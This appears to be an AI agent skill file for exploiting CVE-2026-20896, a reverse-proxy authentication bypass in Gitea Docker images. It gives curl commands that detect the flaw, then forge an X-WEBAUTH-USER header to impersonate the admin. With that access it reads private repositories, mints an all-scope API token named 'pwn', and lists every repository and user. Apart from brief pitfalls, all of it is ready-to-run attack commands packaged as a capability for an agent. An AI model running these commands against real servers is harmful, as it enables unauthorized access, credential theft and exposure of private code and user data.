---
name: gitea-docker-webauth-bypass
description: "Use when Gitea Docker. X-WEBAUTH-USER bypass."
---
# CVE-2026-20896 Gitea Docker Auth Bypass

## Overview
Gitea Docker images <= 1.26.2. When reverse-proxy auth is enabled, the default `REVERSE_PROXY_TRUSTED_PROXIES = *` trusts any client IP, allowing `X-WEBAUTH-USER` header injection to impersonate any user including admin.

## Detection
```bash
# Check Gitea
curl -sI <TARGET> | grep -i 'set-cookie.*gitea\|x-powered-by.*gitea'
curl -s <TARGET>/api/v1/version
# Check if reverse-proxy auth is active (403 without header, 200 with)
curl -s -o /dev/null -w '%{http_code}' -H 'X-WEBAUTH-USER: admin' <TARGET>/
```

## Exploitation
```bash
# Impersonate admin — read any repo
curl -s -H 'X-WEBAUTH-USER: admin' \
  '<TARGET>/<OWNER>/<PRIVATE_REPO>/raw/branch/main/README.md'

# Create API token as admin
curl -s -H 'X-WEBAUTH-USER: admin' \
  -X POST '<TARGET>/api/v1/users/admin/tokens' \
  -H 'Content-Type: application/json' \
  -d '{"name":"pwn","scopes":["all"]}'

# List all repos
curl -s -H 'X-WEBAUTH-USER: admin' \
  '<TARGET>/api/v1/repos/search?limit=50'

# List all users  
curl -s -H 'X-WEBAUTH-USER: admin' \
  '<TARGET>/api/v1/admin/users'
```

## Pitfalls
- Only works when reverse-proxy auth is enabled AND Gitea backend is directly reachable
- If behind a reverse proxy that strips X-WEBAUTH-USER, not exploitable from outside
- Admin username is often `gitea-admin` or first registered user
- Patched in 1.26.3+ by restricting trusted proxy list
- Source: EQSTLab/CVE-2026-20896